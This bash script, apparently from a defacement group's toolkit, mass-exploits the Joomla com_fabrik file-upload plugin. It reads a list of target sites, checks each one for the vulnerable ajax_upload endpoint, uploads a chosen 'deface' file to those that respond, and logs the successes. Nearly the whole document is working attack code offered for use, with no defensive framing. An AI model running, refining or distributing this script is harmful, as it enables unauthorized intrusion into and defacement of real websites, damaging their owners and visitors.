#!/usr/bin/env bash
# Auto Exploit Com_Fabrik
# By xSuxHaxDa a.k.a DayWalker
# Thank's Zerobyte.id
clear
red='\033[0;31m'
cyan='\033[0;36m'
white='\033[1;37m'
NC='\033[0m'
useragent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/56.0";
cat << "ZERO"
 _____              _           _         _     _ 
|__  /___ _ __ ___ | |__  _   _| |_ ___  (_) __| |
  / // _ \ '__/ _ \| '_ \| | | | __/ _ \ | |/ _` |
 / /|  __/ | | (_) | |_) | |_| | ||  __/_| | (_| |
/____\___|_|  \___/|_.__/ \__, |\__\___(_)_|\__,_|
                          |___/                   
----------- DayWalker [at] zerobyte.id ----------
------------ Auto Exploit Com_Fabrik ------------
-------------------------------------------------

ZERO
printf "${cyan}Auto Exploit Com_Fabrik\n\n"
printf "${red}ZEROB${white}YTE.id\n";
printf "${NC}\n"
echo -n "NAME FILE LIST : "; read list
echo -n "NAME FILE DEFACE : "; read fdepes
jem=$list
#printf
while zerobyte= read -r url
do 

function checking() 
{
	ngecheck=$(curl -q --connect-timeout 5 -X POST ${1}"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload" 2>&1 | egrep -o "filepath" );
		if [ "filepath" == "${ngecheck}" ]; then
		printf ${red};
			echo "[VULN] - $url";
		printf ${cyan};
			echo "[EXPLOITATION]"
				curl -q --silent $useragent --connect-timeout 10 -X POST -F file=@${fdepes} "${var}/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload" 2>&1
	 		echo "[SUCCESS] => $url/${fdepes}" | tee -a hasil.txt
	 	printf ${NC};
	 	else
	 	printf ${white};
			echo "[BAD] - $url";
		printf ${NC};
fi
}
checking $url

done < "$jem";